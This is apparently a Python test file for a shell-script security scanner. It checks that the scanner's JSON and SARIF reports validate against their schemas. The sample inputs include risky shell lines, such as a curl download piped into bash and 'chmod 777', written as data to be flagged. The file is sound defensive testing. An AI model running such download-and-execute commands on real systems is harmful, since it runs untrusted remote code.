import copy
import hashlib
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from urllib.request import urlopen

from jsonschema import Draft4Validator, Draft202012Validator, FormatChecker


ROOT = Path(__file__).resolve().parents[1]
SARIF_SCHEMA_URL = (
    "https://docs.oasis-open.org/sarif/sarif/v2.1.0/errata01/os/"
    "schemas/sarif-schema-2.1.0.json"
)
SARIF_SCHEMA_SHA256 = "c3b4bb2d6093897483348925aaa73af03b3e3f4bd4ca38cef26dcb4212a2682e"


def load_sarif_schema():
    local_path = os.environ.get("NEXA_SARIF_SCHEMA_PATH")
    if local_path:
        content = Path(local_path).read_bytes()
    else:
        with urlopen(SARIF_SCHEMA_URL, timeout=30) as response:
            content = response.read(2 * 1024 * 1024 + 1)
    if hashlib.sha256(content).hexdigest() != SARIF_SCHEMA_SHA256:
        raise ValueError("Official SARIF schema SHA-256 does not match the pinned value")
    return json.loads(content)


class ReportSchemaTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        nexa_schema = json.loads(
            (ROOT / "tests" / "schemas" / "nexa-report-1.0.schema.json")
            .read_text(encoding="utf-8")
        )
        sarif_schema = load_sarif_schema()
        Draft202012Validator.check_schema(nexa_schema)
        Draft4Validator.check_schema(sarif_schema)
        cls.nexa_validator = Draft202012Validator(
            nexa_schema, format_checker=FormatChecker()
        )
        cls.sarif_validator = Draft4Validator(
            sarif_schema, format_checker=FormatChecker()
        )

    def run_scan(self, source, *extra):
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            script = root / "sample ñ.sh"
            script.write_bytes(source.encode("utf-8"))
            report_path = root / "report.json"
            sarif_path = root / "report.sarif"
            result = subprocess.run(
                [
                    sys.executable, "-m", "nexa_scriptguard", str(script),
                    "--view", "plain", "--json", str(report_path),
                    "--sarif", str(sarif_path), *extra,
                ],
                cwd=ROOT, capture_output=True, timeout=30, check=False,
            )
            self.assertIn(result.returncode, (0, 3), result.stderr.decode("utf-8", "replace"))
            return (
                json.loads(report_path.read_text(encoding="utf-8")),
                json.loads(sarif_path.read_text(encoding="utf-8")),
            )

    def test_cli_reports_validate_for_complete_incomplete_and_unredacted_scans(self):
        cases = [
            ("chmod 777 file\n", ()),
            ("if then\n", ()),
            ('TOKEN=synthetic_schema_secret\n eval "$TOKEN"\n', ("--include-sensitive-evidence",)),
            ('SOURCE="curl https://example.invalid/a"\n$SOURCE | bash\n', ()),
            ("echo safe\n", ()),
            ("chmod 777 file\n", ("--compat-heuristics",)),
        ]
        for source, options in cases:
            with self.subTest(options=options, source=source):
                report, sarif = self.run_scan(source, *options)
                self.nexa_validator.validate(report)
                self.sarif_validator.validate(sarif)

    def test_schema_validators_reject_malformed_reports(self):
        report, sarif = self.run_scan("chmod 777 file\n")
        invalid_report = copy.deepcopy(report)
        invalid_report["findings"][0]["location"]["start"]["line"] = 0
        self.assertFalse(self.nexa_validator.is_valid(invalid_report))
        invalid_sarif = copy.deepcopy(sarif)
        invalid_sarif["runs"][0]["results"][0]["level"] = "not-a-sarif-level"
        self.assertFalse(self.sarif_validator.is_valid(invalid_sarif))

    def test_sarif_declares_unicode_code_point_columns(self):
        source = "echo 😀; chmod 777 file\n"
        report, sarif = self.run_scan(source)
        finding = next(item for item in report["findings"] if item["rule_id"] == "SG-003")
        result = next(item for item in sarif["runs"][0]["results"] if item["ruleId"] == "SG-003")
        self.assertEqual(finding["column"], source.index("chmod") + 1)
        self.assertEqual(sarif["runs"][0]["columnKind"], "unicodeCodePoints")
        self.assertEqual(
            result["locations"][0]["physicalLocation"]["region"]["startColumn"],
            finding["column"],
        )
        self.sarif_validator.validate(sarif)


if __name__ == "__main__":
    unittest.main()
